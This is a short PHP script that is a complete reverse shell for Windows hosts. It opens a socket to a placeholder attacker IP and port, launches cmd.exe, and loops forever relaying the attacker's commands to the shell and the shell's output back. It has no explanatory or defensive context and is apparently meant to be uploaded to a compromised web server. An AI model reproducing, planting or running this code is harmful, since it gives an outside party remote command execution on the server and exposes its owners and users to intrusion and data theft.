<?php
    set_time_limit (0);
    $sock=fsockopen("#ATTACKER IP#",#ATTACKER PORT#);
    $pfd=array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
    $proc = proc_open("cmd.exe 2>&1", $pfd, $pipes);
    while(1) {
        fwrite($pipes[0],fread($sock,2048));
        fwrite($sock,fread($pipes[1],2048));
    };
?>
